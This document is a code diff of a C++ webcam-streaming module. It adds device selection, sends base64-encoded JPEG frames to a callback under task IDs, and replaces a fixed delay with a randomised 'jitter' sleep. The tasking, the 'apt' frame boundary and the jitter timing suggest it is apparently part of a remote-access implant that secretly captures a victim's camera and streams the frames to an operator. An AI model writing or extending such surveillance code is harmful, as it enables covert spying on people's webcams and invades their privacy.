@@ -48,11 +48,10 @@ namespace streaming {
             screenStreamActive = false;
         }
 
-        void WebcamWorker(int durationSec, std::string taskId, ResultCallback callback) {
+        void WebcamWorker(int durationSec, std::string taskId, ResultCallback callback, int deviceIndex, std::string nameHint) {
             (void)taskId;
             auto startTime = std::chrono::steady_clock::now();
             int chunkId = 0;
-            // Boundary for manual multipart if needed, but our protocol wraps it in base64 result
             
             while (webcamStreamActive) {
                 if (durationSec > 0) {
@@ -60,42 +59,18 @@ namespace streaming {
                     if (elapsed >= durationSec) break;
                 }
 
-                std::vector<BYTE> img = capture::CaptureWebcamImage();
+                std::vector<BYTE> img = capture::CaptureWebcamJPEG(deviceIndex, nameHint);
                 if (!img.empty()) {
-                    // Python builds a full Multipart frame. We will emulate specific behavior if strictly needed.
-                    // Python: SWEBCAM_STREAM_CHUNK:<b64(multipart_part)>
-                    // We will simplify to just sending the image bytes B64 encoded, assuming Server can handle it or we match Python exact format.
-                    // Python code:
-                    /*
-                    part = (
-                        f"--{boundary}\r\n"
-                        f"Content-Type: image/jpeg\r\n"
-                        f"Content-Length: {len(jpg_bytes)}\r\n"
-                        f"X-Frame-Index: {chunk_id}\r\n\r\n"
-                    ).encode() + jpg_bytes + b"\r\n"
-                    */
-                    
-                    std::string boundary = "aptframeboundary";
-                    std::string header = "--" + boundary + "\r\n" +
-                                         "Content-Type: image/jpeg\r\n" +
-                                         "Content-Length: " + std::to_string(img.size()) + "\r\n" +
-                                         "X-Frame-Index: " + std::to_string(chunkId) + "\r\n\r\n";
-                    
-                    std::vector<BYTE> part;
-                    part.insert(part.end(), header.begin(), header.end());
-                    part.insert(part.end(), img.begin(), img.end());
-                    part.push_back('\r'); part.push_back('\n');
-
-                    std::string b64 = crypto::Base64Encode(part);
-                    
-                    callback("webcam_stream_chunk_" + std::to_string(chunkId), "SWEBCAM_STREAM_CHUNK:" + b64);
+                    std::string b64 = crypto::Base64Encode(img);
+                    callback("webcam_stream_chunk_" + std::to_string(chunkId), "WEBCAM_STREAM_CHUNK:" + b64);
                     chunkId++;
                 }
 
-                std::this_thread::sleep_for(std::chrono::milliseconds(1000));
+                int jitter = rand() % 200 + 300;
+                std::this_thread::sleep_for(std::chrono::milliseconds(jitter));
             }
 
-            callback("webcam_stream_end", "SWEBCAM_STREAM_END");
+            callback("webcam_stream_end", "WEBCAM_STREAM_END");
             webcamStreamActive = false;
         }
     }
@@ -114,11 +89,11 @@ namespace streaming {
         // Worker will exit
     }
 
-    void StartWebcamStream(int durationSec, const std::string& taskId, ResultCallback callback) {
+    void StartWebcamStream(int durationSec, const std::string& taskId, ResultCallback callback, int deviceIndex, const std::string& nameHint) {
         std::lock_guard<std::mutex> lock(webcamMutex);
         if (webcamStreamActive) return;
         webcamStreamActive = true;
-        webcamThread = std::thread(WebcamWorker, durationSec, taskId, callback);
+        webcamThread = std::thread(WebcamWorker, durationSec, taskId, callback, deviceIndex, nameHint);
         webcamThread.detach();
     }
 
